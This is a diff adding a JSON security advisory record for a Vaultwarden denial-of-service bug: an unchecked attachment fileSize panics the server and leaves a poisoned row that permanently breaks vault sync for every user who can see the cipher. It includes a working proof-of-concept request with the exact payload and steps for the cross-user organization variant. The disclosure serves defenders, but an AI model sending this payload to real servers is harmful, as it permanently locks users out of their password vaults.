@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-q5x6-grh5-fqgc",
+  "aliases": [],
+  "title": "Unbounded client-declared attachment fileSize causes an out-of-bounds panic that permanently breaks vault sync for every user who can see the cipher",
+  "summary": "### Summary\r\n\r\n`POST /api/ciphers/{id}/attachment/v2` accepts a client-declared `fileSize` and validates only that it is not negative. A value above `1024^6` (~1.15e18, well within `i64`) makes `get_display_size()` index a fixed 6-element array out of bounds and panic.\r\n\r\nThe attachment row is committed to the database **before** the panic, and the operation is not wrapped in a transaction, so the poisoned row persists. Afterwards every endpoint that serialises that cipher - `GET /api/sync`, `GET /api/ciphers`, `GET /api/ciphers/{id}` - panics and returns `500` **permanently**.\r\n\r\nNo file is ever uploaded; the request body is a few hundred bytes.\r\n\r\nIf the poisoned cipher is shared with an organization collection, **every member who can see it - including owners and admins - permanently loses vault sync**. That is a cross-user denial of service triggered by an ordinary member with edit rights.\r\n\r\nConfirmed at runtime against a stock `vaultwarden/server:1.37.1` container.\r\n\r\n### Details\r\n\r\n`src/util.rs:334` - `get_display_size()`:\r\n\r\n```rust\r\npub fn get_display_size(size: i64) -> String {\r\n    const UNITS: [&str; 6] = [\"bytes\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\"];   // valid indices 0..=5\r\n    ...\r\n    let mut unit_counter = 0;\r\n    loop {\r\n        if size > 1024. { size /= 1024.; unit_counter += 1; } else { break; }\r\n    }\r\n    format!(\"{size:.2} {}\", UNITS[unit_counter])                        // src/util.rs:353 - unchecked index\r\n}\r\n```\r\n\r\nAny value that survives six divisions by 1024 yields `unit_counter == 6` and panics at `src/util.rs:353` (`core::panicking::panic_bounds_check`).\r\n\r\n`src/api/core/ciphers.rs` - the v2 attachment endpoint (guard: plain `Headers`, i.e. any logged-in user):\r\n\r\n```rust\r\nlet file_size = data.file_size.into_i64()?;      // src/api/core/ciphers.rs:1150\r\nif file_size < 0 { ... }                          // :1152 - only a lower bound is checked\r\n...\r\nAttachment::new(attachment_id, cipher.uuid, data.file_name, file_size, Some(data.key));  // :1157 - persisted\r\n```\r\n\r\n`file_size` is a `NumberOrString`, so the full `i64` range is accepted. The storage-quota checks live in the separate upload step, which the attacker simply never performs. The row is saved at `:1157`; the panic then occurs while building the response, so the write is never rolled back.\r\n\r\n`Attachment::to_json` (`src/db/models/attachment.rs:74`) calls `get_display_size(self.file_size)`, and is reached from `Cipher::to_json`, which backs `/api/sync`, `/api/ciphers` and `/api/ciphers/{id}`.\r\n\r\nBecause every listing endpoint panics, the victim cannot discover the attachment id through the API in order to delete it - recovery requires direct database access.\r\n\r\n### PoC\r\n\r\nVerified against a clean `vaultwarden/server:1.37.1` instance:\r\n\r\n```\r\ndocker run -d --name vw -p 127.0.0.1:8089:80 -e SIGNUPS_ALLOWED=true vaultwarden/server:1.37.1\r\n```\r\n\r\n**Variant 1 - single account:**\r\n\r\n```\r\nGET  /api/sync                                  -> 200          (baseline)\r\n\r\nPOST /api/ciphers/{cipher_id}/attachment/v2\r\nAuthorization: Bearer <token>\r\nContent-Type: application/json\r\n\r\n{\"key\":\"2.a|b|c\",\"fileName\":\"2.f|f|f\",\"fileSize\":4611686018427387904,\"adminRequest\":false}\r\n                                                -> 500\r\n\r\nGET  /api/sync                                  -> 500   (permanent)\r\nGET  /api/ciphers                               -> 500   (permanent)\r\nGET  /api/ciphers/{cipher_id}                   -> 500   (permanent)\r\n```\r\n\r\nServer log: `core::panicking::panic_bounds_check`.\r\n\r\n**Variant 2 - organization / cross-user (observed):**\r\n\r\n1. Owner creates an organization and a collection, invites a member with edit rights (`type: 2`, `readOnly: false`), and confirms them.\r\n2. Owner creates a cipher in that collection. Baseline: owner `GET /api/sync` → `200`, member → `200`.\r\n3. The **member** sends the poison request above against the **shared** cipher → `500`.\r\n4. Result:\r\n\r\n```\r\nOWNER   GET /api/sync                 -> 500\r\nMEMBER  GET /api/sync...",
+  "published_at": "2026-10-28T18:01:14.000Z",
+  "modified_at": "2026-10-28T18:01:14.000Z",
+  "severity": {
+    "level": "medium",
+    "score": 6.5,
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-129",
+    "CWE-1284"
+  ],
+  "affected": [
+    {
+      "product": "vaultwarden",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "1.37.4"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-q5x6-grh5-fqgc",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-q5x6-grh5-fqgc",
+      "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-q5x6-grh5-fqgc",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:b4c84c1ee9ce8e793205e4287342d6169899f8d37ad51a3177cce04d29a6b95a",
+  "note": null
+}
